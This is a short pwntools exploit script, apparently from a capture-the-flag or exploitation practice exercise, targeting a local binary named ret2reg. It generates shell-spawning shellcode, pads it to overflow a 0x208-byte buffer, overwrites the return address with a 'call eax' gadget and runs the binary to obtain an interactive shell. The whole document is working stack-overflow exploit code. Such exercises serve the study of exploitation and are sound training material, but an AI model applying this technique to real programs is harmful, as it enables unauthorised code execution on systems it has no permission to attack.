from pwn import *

shellcode = asm(shellcraft.sh())

call_eax = p32(0x0804901d)

payload = flat([shellcode , b'a'* (0x208+4 - len(shellcode) ),call_eax])

sh = process(argv=[ "./rop/ret2reg",payload])

sh.interactive()